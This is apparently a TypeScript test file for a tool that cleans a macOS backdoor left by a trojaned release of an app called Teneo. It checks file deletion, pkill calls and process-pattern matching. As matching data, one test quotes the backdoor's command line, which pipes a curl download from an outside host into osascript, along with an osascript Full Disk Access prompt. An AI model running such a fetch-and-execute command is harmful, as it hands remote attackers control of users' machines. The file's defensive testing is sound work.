import { describe, expect, test } from "bun:test";

import {
  backdoorProcesses,
  type CleanupSystem,
  removeBackdoor,
} from "./backdoor-cleanup";

function fakeMac(files: string[]) {
  const present = new Set(files);
  const ran: string[][] = [];
  const system: CleanupSystem = {
    home: "/Users/someone",
    exists: async (path) => present.has(path),
    list: async (folder) =>
      [...present]
        .filter((path) => path.startsWith(`${folder}/`))
        .map((path) => path.slice(folder.length + 1)),
    remove: async (path) => {
      present.delete(path);
    },
    run: async (args) => {
      ran.push(args);
    },
  };
  return { system, present, ran };
}

describe("removeBackdoor", () => {
  test("does nothing on a Mac the trojaned 0.4.2 never ran on", async () => {
    const mac = fakeMac(["/Users/someone/.zshrc", "/tmp/.fdaask-1.as"]);
    expect(await removeBackdoor(mac.system)).toBe(false);
    expect(mac.ran).toEqual([]);
    expect(mac.present.has("/tmp/.fdaask-1.as")).toBe(true);
  });

  test("stops the backdoor and its scripts, then deletes everything it left", async () => {
    const mac = fakeMac([
      "/Users/someone/.teneo-sync-helper",
      "/Users/someone/.teneo-sync.json",
      "/tmp/.httpcode",
      "/tmp/.fdaask-81452.as",
      "/tmp/unrelated.txt",
    ]);
    expect(await removeBackdoor(mac.system)).toBe(true);
    expect(mac.ran).toEqual(
      backdoorProcesses.map((pattern) => ["pkill", "-f", pattern]),
    );
    expect([...mac.present]).toEqual(["/tmp/unrelated.txt"]);
  });

  test("still cleans up when only the marker is left", async () => {
    const mac = fakeMac(["/Users/someone/.teneo-sync.json"]);
    expect(await removeBackdoor(mac.system)).toBe(true);
    expect(mac.present.size).toBe(0);
  });

  test("carries on when stopping a process or deleting a file fails", async () => {
    const mac = fakeMac([
      "/Users/someone/.teneo-sync-helper",
      "/Users/someone/.teneo-sync.json",
    ]);
    mac.system.run = async () => {
      throw new Error("pkill: no matching processes");
    };
    const remove = mac.system.remove;
    mac.system.remove = async (path) => {
      if (path.endsWith(".teneo-sync-helper")) throw new Error("busy");
      await remove(path);
    };
    expect(await removeBackdoor(mac.system)).toBe(true);
    expect([...mac.present]).toEqual(["/Users/someone/.teneo-sync-helper"]);
  });

  test("its process patterns match the backdoor's real command lines and not Teneo's", () => {
    const matches = (line: string) =>
      backdoorProcesses.some((pattern) => new RegExp(pattern).test(line));
    expect(matches("/Users/someone/.teneo-sync-helper")).toBe(true);
    expect(
      matches(
        'sh -c curl -k -s "https://modalgrid.com/dynamic?txd=ac2edb8e" | osascript',
      ),
    ).toBe(true);
    expect(
      matches("/usr/bin/osascript /tmp/.fdaask-81452.as Full Disk Access"),
    ).toBe(true);
    expect(
      matches("/Applications/Teneo.app/Contents/MacOS/tjs run entry.js"),
    ).toBe(false);
  });
});
